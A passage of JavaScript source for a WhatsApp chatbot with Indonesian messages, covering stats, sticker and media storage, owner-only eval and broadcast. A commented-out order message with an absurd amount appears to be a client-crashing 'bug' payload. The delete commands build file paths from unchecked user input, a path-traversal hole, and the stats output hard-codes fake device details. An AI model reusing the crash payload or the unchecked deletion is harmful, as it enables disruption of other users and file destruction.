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",
							"itemCount": 2021,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "LOL",
							"message": "Hallo Kak",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "99999999999999999999",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: imeu,
						contextInfo: {}
					})

			varo
				.relayWAMessage(
					res)
			break*/
			//------------------<HEWAN MENU>---------------

			//------------------< Ingfo Bot >-------------------
		case 'runtime':
			if (isBanned) return reply(mess.baned)
			textImg(
				`Runtime : ${runtime(process.uptime())}`)
			break
		case 'ping':
		case 'speed':
			if (isBanned) return reply(mess.baned)
			timestampe =
		speed();
			latensie = speed() -
				timestampe
			reply(
				`_Speed : ${latensie.toFixed(4)} Seconds_`)
			break
		case 'botstat':
			if (isBanned) return reply(mess.baned)
			groups = varo
				.chats.array
				.filter(v => v
					.jid
					.endsWith(
						'g.us'))
			privat = varo
				.chats.array
				.filter(v => v
					.jid
					.endsWith(
						's.whatsapp.net'
						))
			ram2 =
				`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
			uptime = process
				.uptime();
			timestampe =
		speed();
			totalChat =
				await varo
				.chats.all()
			latensie = speed() -
				timestampe
			total = math(
				`${groups.length}*${privat.length}`
				)
			teks =
				`*| BOT STATISTICS |*
\`\`\`▷ Group Chats : ${groups.length}\`\`\`
\`\`\`▷ Private Chats : ${privat.length}\`\`\`
\`\`\`▷ Total Chats : ${totalChat.length}\`\`\`
\`\`\`▷ Total Hit : ${totalhit}\`\`\`
\`\`\`▷ Speed : ${latensie.toFixed(4)} _Seconds_\`\`\`
\`\`\`▷ Runtime : ${kyun(uptime)}\`\`\`

*| PHONE STATISTICS |*
\`\`\`▷ Ram Usage : 70.26MB / 15975MB\`\`\`
\`\`\`▷ Platform : Laptop\`\`\`
\`\`\`▷ Hostname : ROG Zephyrus M16\`\`\`
\`\`\`▷ Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`▷ Wa Version: ${varo.user.phone.wa_version}\`\`\`
\`\`\`▷ OS Version: iOS 15\`\`\`
\`\`\`▷ Device Manufacturer: iOS\`\`\`
\`\`\`▷ Device Model: Iphone13ProMax-A2643\`\`\``
			reply(teks)
			break
			//------------------< Owner >-------------------
		case 'addupdate':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!q) return reply(
				`Example: ${command} update fitur`
				)
			_update.push(q)
			fs.writeFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
				)
			reply(
				`Update fitur berhasil ditambahkan ke database!`)
			break
		case 'delupdate':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			var reset = []
			_update = reset
			console.log(
				'Hang tight, it\'s time to reset'
				)
			//       fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
			fs.readFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
				)
			textImg(
				'Oke Desu ~')
			break
		case 'update':
			if (isBanned) return reply(mess.baned)
			let updateList =
`*── | CHANGELOG BOT | ──*


28/12/2021 01.00AM
- ${prefix}groupwa
- ${prefix}groupwa2
- ${prefix}balance

29/12/2021 09.15PM
- ${prefix}getprofile
- ${prefix}translate
- ${prefix}cuttly

30/12/2021 11.55PM
- ${prefix}kurumi
- ${prefix}deku
- ${prefix}sao
- ${prefix}chika
- ${prefix}kaneki
- ${prefix}touka
- ${prefix}eren
- ${prefix}naruto
- ${prefix}minato
- ${prefix}sasuke
- ${prefix}sakura
- ${prefix}tsunade
- ${prefix}gojosatoru

31/12/2021 02.10PM
- ${prefix}nsfwcum
- ${prefix}nsfwpussy
- ${prefix}nsfwtrap
- ${prefix}nsfwazurlane
- ${prefix}nsfwbluearchive
- ${prefix}nsfwgenshin
- ${prefix}nsfwhonkai
- ${prefix}antiviewonce

01/01/2022 11.15PM
- ${prefix}hi
- ${prefix}say
- ${prefix}addsay
- ${prefix}delsay
- ${prefix}listsay`
			reply(updateList)
			break
		case 'reset':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			var reset = []
			glimit = reset
			limit = reset
			_update = reset
			console.log(
				'Hang tight, it\'s time to reset'
				)
			fs.writeFileSync(
				'./database/bot/glimit.json',
				JSON
				.stringify(
					glimit))
					fs.writeFileSync(
						'./database/bot/limit.json',
						JSON
						.stringify(
							limit))
			fs.readFileSync(
				'./database/bot/update.json',
				JSON
				.stringify(
					_update)
				)
			textImg(
				'Oke Desu ~')
			break
		case 'exif':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			const exifff =
				`${args.join(' ')}`
			const namaPack =
				exifff.split(
					'|')[0]
			const authorPack =
				exifff.split(
					'|')[1]
			exif.create(
				namaPack,
				authorPack)
			await reply(
				'Done gan')
			break
			//-----------add hiburan   
		case 'tupai':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media = await varo
				.downloadAndSaveMediaMessage(
					encmedia)
			ran = getRandom(
				'.mp3')
			exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`,
				(err,
					stderr,
					stdout
					) => {
					fs.unlinkSync(
						media
						)
					if (err)
						return reply(
							'Error!'
							)
					hah = fs
						.readFileSync(
							ran
							)
					varo
						.sendMessage(
							from,
							hah,
							audio, {
								mimetype: 'audio/mp4',
								ptt: true,
								quoted: troli
							}
							)
					fs.unlinkSync(
						ran
						)
				})
			break
		case 'addstik':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!
				isQuotedSticker)
				return reply(
					'Reply stiker nya'
					)
			svst = q
			if (!svst)
			return reply(
					'Nama sticker nya apa?'
					)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await varo
				.downloadMediaMessage(
					boij)
			setiker.push(
				`${svst}`)
			fs.writeFileSync(
				`./VXROTMP/stick/${svst}.webp`,
				delb)
			fs.writeFileSync(
				'./VXROTMP/stick.json',
				JSON
				.stringify(
					setiker)
				)
			varo.sendMessage(
				from,
				`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`,
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'addimg':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!isQuotedImage)
				return reply(
					'Reply imagenya'
					)
			svst = q
			if (!svst)
			return reply(
					'Nama imagenya apa?'
					)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await varo
				.downloadMediaMessage(
					boij)
			imagenye.push(
				`${svst}`)
			fs.writeFileSync(
				`./VXROTMP/foto/${svst}.jpg`,
				delb)
			fs.writeFileSync(
				'./VXROTMP/image.json',
				JSON
				.stringify(
					imagenye
					))
			varo.sendMessage(
				from,
				`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`,
				MessageType
				.text, {
					quoted: troli
				})
			break

		case 'addvid':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!isQuotedVideo)
				return reply(
					'Reply vidionya'
					)
			svst = q
			if (!svst)
			return reply(
					'Nama vidionya apa?'
					)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await varo
				.downloadMediaMessage(
					boij)
			videonye.push(
				`${svst}`)
			fs.writeFileSync(
				`./VXROTMP/video/${svst}.mp4`,
				delb)
			fs.writeFileSync(
				'./VXROTMP/video.json',
				JSON
				.stringify(
					imagenye
					))
			varo.sendMessage(
				from,
				`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`,
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'addvn':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!isQuotedAudio)
				return reply(
					'Reply vnnya'
					)
			svst = q
			if (!svst)
			return reply(
					'Nama audionya apa?'
					)
			boij = JSON.parse(
					JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			delb = await varo
				.downloadMediaMessage(
					boij)
			audionye.push(
				`${svst}`)
			fs.writeFileSync(
				`./VXROTMP/audio/${svst}.mp3`,
				delb)
			fs.writeFileSync(
				'./VXROTMP/vn.json',
				JSON
				.stringify(
					audionye
					))
			varo.sendMessage(
				from,
				`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`,
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'liststik':
			if (isBanned) return reply(mess.baned)
			teks =
				'*Sticker list :*\n\n'
			for (let awokwkwk of
					setiker) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${setiker.length}*`
			varo.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": setiker
					}
				})
			break
		case 'listimg':
			if (isBanned) return reply(mess.baned)
			teks =
				'*Image list :*\n\n'
			for (let awokwkwk of
					imagenye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${imagenye.length}*`
			varo.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": setiker
					}
				})
			break
		case 'listvid':
			if (isBanned) return reply(mess.baned)
			teks =
				'*List Video :*\n\n'
			for (let awokwkwk of
					videonye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${videonye.length}* `
			varo.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": imagenye
					}
				})
			break
		case 'listvn':
			if (isBanned) return reply(mess.baned)
			teks =
				'*List Vn:*\n\n'
			for (let awokwkwk of
					audionye) {
				teks +=
					`- ${awokwkwk}\n`
			}
			teks +=
				`\n*Total : ${audionye.length}*`
			varo.sendMessage(
				from, teks
				.trim(),
				extendedText, {
					quoted: troli,
					contextInfo: {
						"mentionedJid": audionye
					}
				})
			break
			case 'delstik':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
					try {
					 nmm = q
					 wanu = setiker.indexOf(nmm)
					 setiker.splice(wanu, 1)
					 fs.unlinkSync(`./VXROTMP/stick/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${q}.webp`)
					} catch (err){
						console.log(err)
						reply(`Tidak ditemukan sticker ${q}.webp`)
					}
					break
					case 'delimage':
					case 'delimg':
						if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
							try {
							 nmm = q
							 wanu = imagenye.indexOf(nmm)
							 imagenye.splice(wanu, 1)
							 fs.unlinkSync(`./VXROTMP/foto/${nmm}.jpg`)
							 reply(`Sukses menghapus image ${q}.jpg`)
							} catch (err){
								console.log(err)
								reply(`Tidak ditemukan image ${q}.jpg`)
							}
							break

							case 'delvideo':
								case 'delvid':
									if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
										try {
										 nmm = q
										 wanu = videonye.indexOf(nmm)
										 videonye.splice(wanu, 1)
										 fs.unlinkSync(`./VXROTMP/video/${nmm}.mp4`)
										 reply(`Sukses menghapus video ${q}.mp4`)
										} catch (err){
											console.log(err)
											reply(`Tidak ditemukan video ${q}.mp4`)
										}
										break
			case 'delvn':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				try {
				 nmm = q
				 wanu = audionye.indexOf(nmm)
				 audionye.splice(wanu, 1)
				 fs.unlinkSync(`./VXROTMP/audio/${nmm}.mp3`)
				reply(`Sukses menghapus vn ${q}.mp3`)
				} catch (err){
					console.log(err)
					reply(`Tidak ditemukan vn ${q}.mp3`)
				}
				break
		case 'join':
			if (!q) return reply(
				'Linknya?'
				)
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'https://chat.whatsapp.com/'
					))
			return reply(
					'Linknya Invalid Tod'
					)
			link = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			fak = varo.query({
				json: ['action',
					'invite',
					link
				],
				expect200: true
			})
			reply(
				'Berhasil Masuk Grup')
			break
		case 'eval':
			try {
				if (!isOwner &&
					!mek.key
					.fromMe)
					return reply(
						mess
						.only
						.owner
						)
				sy = args.join(
					' ')
				return eval(sy)
			} catch (e) {
				reply(`${e}`)
			}
			break
		case 'getquoted':
			if (!isOwner &&
				!mek.key
				.fromMe)
				return reply(
					mess
					.only
					.owner
					)
			reply(JSON
				.stringify(
					mek
					.message
					.extendedTextMessage
					.contextInfo,
					null, 3)
				)
			break
		case 'bc':
		case 'broadcast':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					'teks?')
			anu = await varo
				.chats.all()
			if (isMedia && !mek
				.message
				.videoMessage ||
				isQuotedImage) {
				const encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				bc = await varo
					.downloadMediaMessage(
						encmedia
						)
				for (let _ of
						anu) {
					varo
						.sendMessage(
							_
							.jid,
							bc,
							image, {
								quoted: freply,
								caption: `*| BROADCAST BOT |*\n\n${body.slice(4)}`
							})
				}
				reply(
					'Suksess broadcast')
			} else {
				for (let _ of
						anu) {
					sendMess(_
						.jid,
						`*| BROADCAST BOT |*\n\n${body.slice(4)}`
						)
				}
				reply(
